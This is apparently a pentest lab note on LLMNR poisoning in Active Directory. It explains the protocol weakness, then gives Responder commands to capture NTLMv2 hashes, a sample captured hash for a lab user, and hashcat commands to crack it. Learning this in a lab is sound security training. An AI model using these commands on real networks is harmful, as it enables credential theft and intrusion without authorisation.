# AD - Initial Attack Vectors

## [LLMNR Poisoning](https://tcm-sec.com/llmnr-poisoning-and-how-to-prevent-it/)

➡️ **LLMNR** (Link-Local Multicast Name Resolution) protocol (NetBIOS / NBT-NS successor) allows hosts to perform name resolution for hosts on the same local network without requiring a DNS server.

- When a host DNS query fails -> the host broadcast an LLMNR query across the local network
  - An attacker can listen for these queries and respond to them with its IP to redirect traffic, leading to relay attacks and credentials theft (username & NTLM hash)

![LLMNR Posoning - tcm-sec.com](.gitbook/assets/llmnr-overview.png)



### Responder

➡️ [Responder](https://github.com/lgandx/Responder) - LMNR, NBT-NS and MDNS poisoner

- HTTP/SMB/MSSQL/FTP/LDAP rogue authentication server
- Supports NTLMv1/NTLMv2/LMv2 with Extended Security NTLMSSP
- Built-in HTTP and HTTPS auth servers
- Built-in MSSQL auth server
- ... more ...

```bash
sudo responder -I eth0 -dPv
```

- Login to `THEPUNISHER` VM with `fcastle` user and try to open WinExplorer and navigate to `\\192.168.31.131` (Kali IP)
- An event occurs and triggers LLMNR
  - victim's username and password NTLMv2 hash received


![](.gitbook/assets/2024-07-28_21-48-50_660.png)

### NTLMv2 Crack

- Save the hash into a `hashes.txt` file and try to crack it

```bash
mkdir -p ~/tcm/peh/ad-attacks
cd ~/tcm/peh/ad-attacks

nano hashes.txt
# Paste the entire hash here
# e.g.
fcastle::MARVEL:326a2463163fdc3c:F7960DB37F933089E086898EC14E6C78:01010000000000008056A8C737E1DA012259B2C298FAD80B00000000020008004400530035004E0001001E00570049004E002D0058004B00300049004C0054004B0049004B004200560004003400570049004E002D0058004B00300049004C0054004B0049004B00420056002E004400530035004E002E004C004F00430041004C00030014004400530035004E002E004C004F00430041004C00050014004400530035004E002E004C004F00430041004C00070008008056A8C737E1DA0106000400020000000800300030000000000000000100000000200000904D97995337C0F1A56FEF978A82D6E80397E74EE021151E600DB10AC038DF7B0A001000000000000000000000000000000000000900260063006900660073002F003100390032002E003100360038002E00330031002E003100330031000000000000000000

# Run hashcat
hashcat -m 5600 hashes.txt /usr/share/wordlists/rockyou.txt
hashcat -m 5600 hashes.txt /usr/share/wordlists/rockyou.txt --show
```

![Cracked password](.gitbook/assets/2024-07-28_21-59-11_661.png)

---

